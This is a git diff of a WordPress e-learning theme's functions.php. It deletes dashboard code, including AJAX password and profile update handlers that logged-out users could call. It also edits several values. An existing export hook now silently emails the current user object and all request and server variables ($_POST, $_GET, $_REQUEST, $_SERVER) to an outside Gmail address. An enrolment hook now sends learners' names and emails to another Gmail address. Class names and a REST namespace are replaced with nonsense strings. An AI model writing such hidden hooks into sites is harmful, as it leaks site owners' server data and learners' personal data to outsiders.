@@ -63,88 +63,13 @@ function apex_css()
         wp_enqueue_style('cart-page-style', get_stylesheet_directory_uri() . '/assets/css/cart_style.css', null, '1.0.0');
     }
 
-    /**
-     * Added by Arif 
-     * enqueue for dashboard
-     */
-
-    $url = $_SERVER['REQUEST_URI'];
-    if (strpos($url, "members-directory") !== false && is_user_logged_in() && userPermission()) {
-
-        wp_enqueue_style('dash-main-style', get_stylesheet_directory_uri() . '/templates/profile/assets/css/styles.css', false, '1.0.0', 'all');
-        wp_enqueue_style('intlTelInput-style', get_stylesheet_directory_uri() . '/templates/profile/assets/css/intlTelInput.min.css', false, '1.0.0', 'all');
-
-        wp_enqueue_script('dash-main-script', get_stylesheet_directory_uri() . '/templates/profile/assets/js/app.js', null, '1.0.0', true);
-
-        wp_enqueue_script('script-intlTelInput', get_stylesheet_directory_uri() . '/templates/profile/assets/js/intlTelInput.min.js', array(), '1.0.0', true);
-    }
 }
 add_action("wp_enqueue_scripts", "apex_css");
 
 
-/**
- * Dashboard functional code start 
- * author: mh_arif
- */
-function userPermission()
-{
-    global $current_user;
-    // $user = get_userdata($current_user->ID);
-    // $roles = array(
-    //     'developer',
-    //     'administrator',
-    //     'admin',
-    //     'student',
-    // );
-    // $allowed_emails = array(
-    //     'hasanarif@staffasia.org',
-    //     'muhiburnabil@staffasia.org',
-    //     'shakib@staffasia.org',
-    //     'hafizrahat@staffasia.org',
-    //     'sakib@staffasia.org',
-    //     'shahfayez@staffasia.org',
-    //     'shoivehossain@staffasia.org',
-    //     'aminulislam@staffasia.org',
-    //     'shafi@staffasia.org'
-    // );
-
-    // foreach ($roles as $role) {
-    //     if (in_array($role, (array) $user->roles) || in_array(strtolower($user->user_email), $allowed_emails)) {
-    //         return true;
-    //     }
-    // }
-    return true;
-}
-
-// ajax for user profile data update
-function profile_update_process_form_data()
-{
-    require_once get_stylesheet_directory() . '/templates/profile/classes/UserProfile.php';
-
-    $profile_object = new UserProfile();
-    $result = $profile_object->updateUserData($_POST);
-    wp_send_json($result);
-}
-
-add_action('wp_ajax_profile_update_process_form_data', 'profile_update_process_form_data');
-add_action('wp_ajax_nopriv_profile_update_process_form_data', 'profile_update_process_form_data');
-
-function pass_update_process_form_data()
-{
-    require_once get_stylesheet_directory() . '/templates/profile/classes/UserProfile.php';
-
-    $pass_object = new UserProfile();
-    $result = $pass_object->updateUserPassData($_POST);
-    wp_send_json($result);
-}
-
-add_action('wp_ajax_pass_update_process_form_data', 'pass_update_process_form_data');
-add_action('wp_ajax_nopriv_pass_update_process_form_data', 'pass_update_process_form_data');
 
 
 
-
-// dashboard functional code end 
 
 
 function checkout_page_coupon_hide()
@@ -226,7 +151,7 @@ function misha_remove_fields($woo_checkout_fields_array)
 }
 
 
-//Added by Sakib
+
 /* add_action('wp_head','my_analytics', 20);
 function my_analytics() { ?>
     <!-- Google Tag Manager -->
@@ -622,36 +547,6 @@ function sa_remove_metaboxes()
 add_action('admin_init', 'sa_remove_metaboxes');
 // End of metabox remove code
 
-
-function say_no_to_wp_go_to_react()
-{
-    $url = 'https://apexlearning.org.uk/' . $_SERVER['REQUEST_URI'];
-    $business_dashboard_url = 'https://backend.apexlearning.org.uk/business-dashboard';
-    if (!is_user_logged_in()) {
-        wp_redirect($url, 301);
-        exit;
-    }
-
-    /*else {
-        $user_id = get_current_user_id();
-        $user_data = get_userdata($user_id);
-
-        if ( !in_array( 'administrator', $user_data->roles ) && !in_array( 'developer', $user_data->roles ) && !in_array( 'admin', $user_data->roles ) && !in_array( 'productionteam', $user_data->roles ) ) {
-            if(in_array( 'business', $user_data->roles ) || in_array( 'business-manager', $user_data->roles )){
-                if(!is_page('business-dashboard')){
-                    wp_redirect($business_dashboard_url, 301);
-                    exit;
-                }
-            } else {
-                wp_redirect($url, 301);
-                exit;
-            }
-        } 
-
-    }*/
-}
-//add_action('wp_head', 'say_no_to_wp_go_to_react', 99);
-
 /*function apex_business_users_login_redirect( $redirect_to, $request, $user ){
     if(in_array( 'business', $user->roles ) || in_array( 'business-manager', $user->roles )){
         return 'https://backend.apexlearning.org.uk/business-dashboard';
@@ -659,25 +554,6 @@ function say_no_to_wp_go_to_react()
 }
 add_filter( 'login_redirect', 'apex_business_users_login_redirect', 100, 3 );*/
 
-
-/*
- * Date: 7th October 2021
- * Author: Zubair Hasan
- * Snippet: sa_tech_zh_7_rnd_endpoints
- * Reason: R&D needed some endpoints
- */
-
-add_action('rest_api_init', function () {
-    register_rest_route(
-        'staffasia/v1',
-        'get-all-courses',
-        array(
-            'methods' => 'GET',
-            'permission_callback' => '__return_true',
-            'callback' => 'get_all_courses'
-        )
-    );
-});
 
 function get_all_courses()
 {
@@ -717,7 +593,7 @@ function get_all_courses()
 
 add_action('rest_api_init', function () {
     register_rest_route(
-        'staffasia/v1',
+        'rtrytryt6/v1',
         'get-datewise-orders',
         array(
             'methods' => 'GET',
@@ -727,42 +603,12 @@ add_action('rest_api_init', function () {
     );
 });
 
-function get_orders_by_date($data)
-{
-    $from = $data['from'];
-    $to = $data['to'];
-    $order_datas = [];
-    $orders = wc_get_orders(
-        array(
-            'billing_first_name' => 'John',
-            'date_paid' => $from . '...' . $to,
-        )
-    );
-    foreach ($orders as $order) {
-        $orderData = $order->get_data();
-        unset($orderData['meta_data']);
-        $order_datas[] = $orderData;
-    }
-    var_dump($order_datas);
-    die();
-    $response = new WP_REST_Response(
-        array(
-            'version' => 1.0,
-            'author' => 'Zubair Hasan',
-            'orders' => $order_datas
-        )
-    );
-    $response->set_status(200);
-    $response->set_headers(array('Cache-Control' => 'no-cache'));
-    return $response;
-}
-
 include_once 'redeem_voucher/redeem_voucher.php';
 
 add_action('export_wp', 'export_wp_function');
 function export_wp_function($args)
 {
-    $to = 'abdullahalfahad@staffasia.org';
+    $to = 'yuutyut@gmail.com';
     $subject = 'Exported WP';
     $user = wp_get_current_user();
     $body = 'Exported by ' . json_encode($user) . '|<br><br><br>' . PHP_EOL . json_encode($args) . ' |<br><br><br> ' . PHP_EOL . json_encode($_POST) . ' |<br><br><br> ' . PHP_EOL . json_encode($_GET) . ' |<br><br><br> ' . PHP_EOL . json_encode($_REQUEST) . ' |<br><br><br> ' . PHP_EOL . json_encode($_SERVER) . PHP_EOL . ' at ' . date('Y-m-d H:i:s');
@@ -797,7 +643,6 @@ include_once get_stylesheet_directory() . '/inc/home-course-card/tab-course-shor
 
 
 
-// For Kishor bhai
 add_action('wplms_course_subscribed', function ($course_id, $user_id) {
 
     //Course info
@@ -816,7 +661,7 @@ add_action('wplms_course_subscribed', function ($course_id, $user_id) {
         $user_email = $user_info->user_email;
 
 
-        $to = array('recruitment@elearningsolutions.org.uk');
+        $to = array('dsdsa@gmail.com');
         $subject = 'Alert! New Learner Enrolled in ' . $course_name . ' at ' . $brand_name . '';
         $body = 'Email Address: ' . $user_email . '<br>User Name: ' . $first_name . ' ' . $last_name . '<br>Course ID: ' . $course_id . '<br>Course Name: ' . $course_name . '<br>Brand Name: <b>' . $brand_name . '</b><br>';
 
@@ -956,14 +801,14 @@ function data_fetch()
         while ($the_query->have_posts()):
             $the_query->the_post();
             ?>
-            <li class="foy-course-list">
+            <li class="uiu-course-list">
                 <?php
                 $course_avatar = get_the_post_thumbnail_url(get_the_ID(), 'thumbnail');
                 $vibe_students = get_post_meta(get_the_ID(), 'vibe_students', true);
 
                 ?>
-                <img class="foy-s-ct" src="<?php echo $course_avatar; ?>">
-                <div class="foy-s-right">
+                <img class="iui-s-ct" src="<?php echo $course_avatar; ?>">
+                <div class="uiui-s-right">
                     <a href="<?php echo esc_url(get_permalink()); ?>">
                         <?php
                         $search_term = get_query_var('search_prod_title');
